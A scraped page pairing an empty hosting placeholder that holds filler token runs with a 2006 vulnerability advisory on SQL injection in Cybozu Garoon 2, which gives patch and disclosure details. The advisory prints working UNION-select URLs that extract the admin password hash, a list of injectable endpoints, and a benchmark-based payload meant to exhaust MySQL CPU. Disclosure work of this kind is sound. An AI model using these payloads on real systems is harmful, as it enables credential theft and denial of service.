=== Content from www.vupen.com_3e8ba0a1_20250125_003641.html ===

[![](/__ovh/common/img/logo-white.png)](https://www.ovhcloud.com/)

![](/__ovh/common/img/icon-traffic-cone.png)

# Site en construction

![](/__ovh/common/img/shadow.png)

Besoin d'assistance ou d'informations ?

[![](/__ovh/common/img/icon-book.png)
Guides](https://docs.ovh.com/fr/hosting/ "Guides")
[![](/__ovh/common/img/icon-speech-bubble.png)
Forum](https://community.ovh.com/ "Forum")
[![](/__ovh/common/img/icon-user-support.png)
Contact](https://help.ovhcloud.com/fr/ "Contact")
[![](/__ovh/common/img/icon-app-gear.png)
Espace Client](https://www.ovh.com/manager/ "Espace Client")

© Copyright 1999 [OVHcloud](https://www.ovhcloud.com/)

v1v2v3v4v5v6v7v8v9v10v11v12v13v14v15v16v17v18v19v20v21v22v23v24v25v26v27v28v29v30v31v32v33v34v35v36v37v38v39v40v41v42v43v44v45v46v47v48v49v50v51v52v53v54v55v56v57v58v59v60v61v62v63v64v65v66v67v68v69v70

u1u2u3u4u5u6u7u8u9u10u11u12u13u14u15u16u17u18u19u20u21u22u23u24u25u26u27u28u29u30u31u32u33u34u35u36u37u38u39u40u41u42u43u44u45u46u47u48u49u50u51u52u53u54u55u56u57u58u59u60u61u62u63u64u65u66u67u68u69

p1p2p3p4p5p6p7p8p9p10p11p12p13p14p15p16p17p18p19p20p21p22p23p24p25p26p27p28p29p30p31p32p33p34p35p36p37p38p39p40p41p42p43p44p45p46p47p48p49p50p51p52p53p54p55p56p57p58p59p60p61p62p63p64

e1e2e3e4e5e6e7e8e9e10e11e12e13e14e15e16e17e18e19e20e21e22e23e24e25e26e27e28e29e30e31e32e33e34e35e36e37e38e39e40e41e42e43e44e45e46e47e48e49e50e51e52e53

n1n2n3n4n5n6n7n8n9n10n11n12n13n14n15n16n17n18n19n20n21n22n23n24n25n26n27n28n29n30n31n32n33n34n35n36n37n38n39n40n41n42n43n44n45n46n47n48n49n50n51n52n53n54n55n56n57n58n59n60n61n62

---

c1c2c3c4c5c6c7c8c9c10c11c12c13c14c15c16c17c18c19c20c21c22c23c24c25c26c27c28c29c30c31c32c33c34c35c36c37c38c39c40c41c42c43c44c45c46c47c48c49c50c51

o1o2o3o4o5o6o7o8o9o10o11o12o13o14o15o16o17o18o19o20o21o22o23o24o25o26o27o28o29o30o31o32o33o34o35o36o37o38o39o40o41o42o43o44o45o46o47o48o49o50o51o52o53o54o55o56o57o58o59o60o61o62o63

m1m2m3m4m5m6m7m8m9m10m11m12m13m14m15m16m17m18m19m20m21m22m23m24m25m26m27m28m29m30m31m32m33m34m35m36m37m38m39m40m41m42m43m44m45m46m47m48m49m50m51m52m53m54m55m56m57m58m59m60m61



=== Content from vuln.sg_720889a8_20250125_003641.html ===


| [vuln.sg](/)      | vuln.sg Vulnerability Research Advisory | | --- | | Cybozu Garoon 2 SQL Injection Vulnerabilities by Tan Chew Keong Release Date: 2006-08-28  [[en](cybozugaroon-en.html)] [[jp](cybozugaroon-jp.html)]  **Summary** Some SQL injection vulnerabilities have been found in [Cybozu Garoon 2](http://garoon.cybozu.co.jp/). When exploited by a logon user, the vulnerabilities allow manipulation of SQL statements which can lead to disclosure of information from the database, or to cause the backend MySQL database to consume large amount of CPU resources.   **Tested Versions** Cybozu Garoon 2 Version 2.1.0 for Windows   **Details** This advisory discloses several SQL injection vulnerabilities in Cybozu Garoon 2. 1) TODO List View/Modify SQL Injection Cybozu Garoon 2 does not properly sanitise the "tid" parameter in the TODO List View and Modify functionality. It is possible for a logon user to exploit this vulnerability to select values from arbitrary tables in the database.  When logon as a normal user:   **TESTING NOTE a** - In order for the examples to work, you must first logon as a user, then click on the TODO List link (icon) to go to the TODO List index page, before using the exploit.  **TESTING NOTE b** - Example 2 requires that at least 1 TODO List category has been created (category value 1).  **Example 1:**  To retrieve the admin user's password hash via TODO List View.  http://192.168.1.64/scripts/cbgrn/grn.exe/todo/view?tid=**9999999)+union+select+1,null,col\_foreign\_key,col\_password,2,null,0,null,null,null,null+from+tab\_cb\_user+where+\_id=1/\***&cid=    **Example 2:**  To retrieve the admin user's password hash via TODO List Modify.  http://192.168.1.64/scripts/cbgrn/grn.exe/todo/modify?tid=**9999999)+union+select+1,null,col\_foreign\_key,col\_password,**1**,null,0,null,null,null,null+from+tab\_cb\_user+where+\_id=1/\***&cid=    **Original Query:**  SELECT tab\_grn\_todo\_entity.\_id,tab\_grn\_todo\_entity.col\_user,tab\_grn\_todo\_entity.col\_title,tab\_grn\_todo\_entity.col\_memo,tab\_grn\_todo\_entity.col\_category,tab\_grn\_todo\_entity.col\_expiration,tab\_grn\_todo\_entity.col\_limited,tab\_grn\_todo\_entity.col\_finish,tab\_grn\_todo\_entity.col\_priority,tab\_grn\_todo\_entity.col\_ctime,tab\_grn\_todo\_entity.col\_mtime FROM tab\_grn\_todo\_entity WHERE (\_id = **9999999 AND col\_user = 2) LIMIT 0, 18446744073709551615 LOCK IN SHARE MODE**  **Manipulated Query:**  SELECT tab\_grn\_todo\_entity.\_id,tab\_grn\_todo\_entity.col\_user,tab\_grn\_todo\_entity.col\_title,tab\_grn\_todo\_entity.col\_memo,tab\_grn\_todo\_entity.col\_category,tab\_grn\_todo\_entity.col\_expiration,tab\_grn\_todo\_entity.col\_limited,tab\_grn\_todo\_entity.col\_finish,tab\_grn\_todo\_entity.col\_priority,tab\_grn\_todo\_entity.col\_ctime,tab\_grn\_todo\_entity.col\_mtime FROM tab\_grn\_todo\_entity WHERE (\_id = **9999999) union select 1,null,col\_foreign\_key,col\_password,2,null,0,null,null,null,null from tab\_cb\_user where \_id=1/\* AND col\_user = 2) LIMIT 0, 18446744073709551615 LOCK IN SHARE MODE**    2) Workflow View/Print SQL Injection Cybozu Garoon 2 does not properly sanitise the "pid" parameter in the Workflow View and Print functionality. It is possible for a logon user to exploit this vulnerability to select values from arbitrary tables in the database.   **Example 1:**  To retrieve the admin user's password hash via Workflow View.  http://192.168.1.64/scripts/cbgrn/grn.exe/workflow/view?fid=9&pid=**8888888+union+select+1,2,3,4,5,6,7,8,9,10,11,12,col\_foreign\_key,14,col\_password,16,17,18,19,20,21,22+from+tab\_cb\_user where \_id=1/\***    **Original Query:**  SELECT col\_name,col\_petition\_number,col\_user,col\_user\_name,col\_user\_foreign\_key,col\_status,col\_form,col\_form\_name,col\_icon\_type,col\_icon\_id,col\_icon\_url,col\_transactor,col\_transactor\_name,col\_transactor\_foreign\_key,col\_comment,col\_ptime,col\_reapply,col\_creator,col\_creator\_name,col\_creator\_foreign\_key,col\_ctime,\_id FROM tab\_grn\_workflow\_petition WHERE \_id = **8888888** LIMIT 0, 1 LOCK IN SHARE MODE  **Manipulated Query:**  SELECT col\_name,col\_petition\_number,col\_user,col\_user\_name,col\_user\_foreign\_key,col\_status,col\_form,col\_form\_name,col\_icon\_type,col\_icon\_id,col\_icon\_url,col\_transactor,col\_transactor\_name,col\_transactor\_foreign\_key,col\_comment,col\_ptime,col\_reapply,col\_creator,col\_creator\_name,col\_creator\_foreign\_key,col\_ctime,\_id FROM tab\_grn\_workflow\_petition WHERE \_id = **8888888 union select 1,2,3,4,5,6,7,8,9,10,11,12,col\_foreign\_key,14,col\_password,16,17,18,19,20,21,22 from tab\_cb\_user where \_id=1/\*** LIMIT 0, 1 LOCK IN SHARE MODE   ---   **Example 2:**  To retrieve the admin user's password hash via Workflow Print.  http://192.168.1.64/scripts/cbgrn/grn.exe/workflow/print?fid=9&pid=**7777777+union+select+col\_password,2,3,4,col\_foreign\_key,6,7,8,9,10,11,12,13,14,15,16,17,18+from+tab\_cb\_user where \_id=1/\***  **Note:** In order for example 2 to work, "fid" must be a valid folder ID.    **Original Query:**  SELECT col\_name,col\_petition\_number,col\_user,col\_status,col\_form\_name,col\_icon\_type,col\_icon\_id,col\_icon\_url,col\_transactor,col\_transactor\_name,col\_transactor\_foreign\_key,col\_ptime,col\_reapply,col\_creator,col\_creator\_name,col\_creator\_foreign\_key,col\_ctime,\_id FROM tab\_grn\_workflow\_petition WHERE \_id = **7777777** LIMIT 0, 1 LOCK IN SHARE MODE  **Manipulated Query:**  SELECT col\_name,col\_petition\_number,col\_user,col\_status,col\_form\_name,col\_icon\_type,col\_icon\_id,col\_icon\_url,col\_transactor,col\_transactor\_name,col\_transactor\_foreign\_key,col\_ptime,col\_reapply,col\_creator,col\_creator\_name,col\_creator\_foreign\_key,col\_ctime,\_id FROM tab\_grn\_workflow\_petition WHERE \_id = **7777777 union select col\_password,2,3,4,col\_foreign\_key,6,7,8,9,10,11,12,13,14,15,16,17,18 from tab\_cb\_user where \_id=1/\*** LIMIT 0, 1 LOCK IN SHARE MODE    3) Other SQL Injection Vulnerabilities Several other SQL injection vulnerabilities exists. These may e.g. be exploited to cause the MySQL-based Cybozu Database Engine to consume large amount of CPU resources, potentially causing a DoS.   **SQL Injection:**  http://192.168.1.64/scripts/cbgrn/grn.exe/todo/index?cid=[SQL] http://192.168.1.64/scripts/cbgrn/grn.exe/todo/delete?tid=[SQL] http://192.168.1.64/scripts/cbgrn/grn.exe/schedule/user\_view?uid=1[SQL] http://192.168.1.64/scripts/cbgrn/grn.exe/phonemessage/add?gid=1&uid=1[SQL] http://192.168.1.64/scripts/cbgrn/grn.exe/phonemessage/history?gid=1&uid=1[SQL] http://192.168.1.64/scripts/cbgrn/grn.exe/memo/view?iid=1[SQL]&did= http://192.168.1.64/scripts/cbgrn/grn.exe/memo/print?iid=1[SQL]&did= http://192.168.1.64/scripts/cbgrn/grn.exe/schedule/view?event=1[SQL] http://192.168.1.64/scripts/cbgrn/grn.exe/schedule/view?event=1&uid=1[SQL]   ---   **Test Samples:**  http://192.168.1.64/scripts/cbgrn/grn.exe/todo/index?cid=' http://192.168.1.64/scripts/cbgrn/grn.exe/todo/delete?tid=' http://192.168.1.64/scripts/cbgrn/grn.exe/schedule/user\_view?uid=1' http://192.168.1.64/scripts/cbgrn/grn.exe/phonemessage/add?gid=1&uid=1' http://192.168.1.64/scripts/cbgrn/grn.exe/phonemessage/history?gid=1&uid=1' http://192.168.1.64/scripts/cbgrn/grn.exe/memo/view?iid=1'&did= http://192.168.1.64/scripts/cbgrn/grn.exe/memo/print?iid=1'&did= http://192.168.1.64/scripts/cbgrn/grn.exe/schedule/view?event=1' http://192.168.1.64/scripts/cbgrn/grn.exe/schedule/view?event=1&uid=1'  ---   **Example Exploit Against MySQL Backend:**  http://192.168.1.64/scripts/cbgrn/grn.exe/todo/index?cid=**9999999)+ORDER+BY+\_id,rand(benchmark(1000000000000,sha1(123456781234567812345678)))/\*** **Original Query:**  SELECT tab\_grn\_todo\_categoryentity.\_id,tab\_grn\_todo\_categoryentity.col\_user,tab\_grn\_todo\_categoryentity.col\_title,tab\_grn\_todo\_categoryentity.col\_list\_index,tab\_grn\_todo\_categoryentity.col\_ctime,tab\_grn\_todo\_categoryentity.col\_mtime FROM tab\_grn\_todo\_categoryentity WHERE (\_id = **9999999** and AND col\_user = 2) LIMIT 0, 18446744073709551615 LOCK IN SHARE MODE  **Manipulated Query:**  This request can potentially cause MySQL to consume large amount of CPU resources.  SELECT tab\_grn\_todo\_categoryentity.\_id,tab\_grn\_todo\_categoryentity.col\_user,tab\_grn\_todo\_categoryentity.col\_title,tab\_grn\_todo\_categoryentity.col\_list\_index,tab\_grn\_todo\_categoryentity.col\_ctime,tab\_grn\_todo\_categoryentity.col\_mtime FROM tab\_grn\_todo\_categoryentity WHERE (\_id = **9999999) ORDER BY \_id,rand(benchmark(1000000000000,sha1(123456781234567812345678)))/\*** AND col\_user = 2) LIMIT 0, 18446744073709551615 LOCK IN SHARE MODE     **Patch / Workaround** [Update](http://garoon.cybozu.co.jp/download/) to version 2.1.1.   **References** <http://cybozu.co.jp/products/dl/notice_060825/>   **Disclosure Timeline** 2006-07-04 - Vulnerability Discovered. 2006-07-13 - Initial Vendor Notification. 2006-07-13 - Initial Vendor Reply. 2006-07-14 - Received scheduled patch release date from vendor. 2006-08-16 - Received notification that patch release will be delayed. 2006-08-25 - Vendor released patch information on website. 2006-08-28 - Public Disclosure. 2006-08-31 - Corrected spelling error in product name. |      | Contact | | --- | | For further enquries, comments, suggestions or bug reports, simply email them to gs TOD nluv TA gnoek&#119ehc | ||

| --- | --- | --- | --- | --- |


